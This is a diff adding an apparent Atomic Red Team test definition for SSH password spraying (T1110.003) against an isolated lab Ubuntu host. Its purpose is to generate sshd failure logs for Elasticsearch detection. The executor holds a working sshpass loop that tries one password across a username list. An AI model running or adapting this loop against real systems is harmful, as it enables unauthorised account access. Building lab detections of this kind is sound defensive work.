@@ -1,0 +1,35 @@
+attack_technique: T1110.003
+display_name: 'Brute Force: Password Spraying (DATN lab extension)'
+atomic_tests:
+  - name: 'DATN lab SSH password spraying from Kali to Ubuntu'
+    auto_generated_guid: 9d3c97df-01f6-44b8-b28e-4a56e2d781eb
+    description: |
+      Attempt one deliberately invalid lab password against five nonexistent
+      lab usernames on the isolated Ubuntu target. The resulting sshd failures
+      should be sent to Elasticsearch by Filebeat. Run only on DATN VMnet10.
+    supported_platforms:
+      - linux
+    input_arguments:
+      target_host:
+        description: Ubuntu Server address within the DATN lab
+        type: string
+        default: '192.168.10.103'
+      users_file:
+        description: Five nonexistent lab usernames
+        type: path
+        default: PathToAtomicsFolder/T1110.003/src/lab_users.txt
+      password:
+        description: Deliberately invalid password used once per username
+        type: string
+        default: 'DATN-Invalid-Password-2026'
+    executor:
+      name: sh
+      elevation_required: false
+      command: |
+        export SSHPASS='#{password}'; for user in $(cat '#{users_file}'); do sshpass -e ssh -o StrictHostKeyChecking=accept-new -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 -p 22 "$user@#{target_host}" true >/dev/null 2>&1 || true; sleep 2; done; unset SSHPASS
+    dependencies:
+      - description: sshpass is installed and the five-user lab list exists
+        prereq_command: |
+          command -v sshpass >/dev/null 2>&1 && test -f '#{users_file}'
+        get_prereq_command: |
+          echo 'Install sshpass with the OS package manager and place the lab user list before executing.'
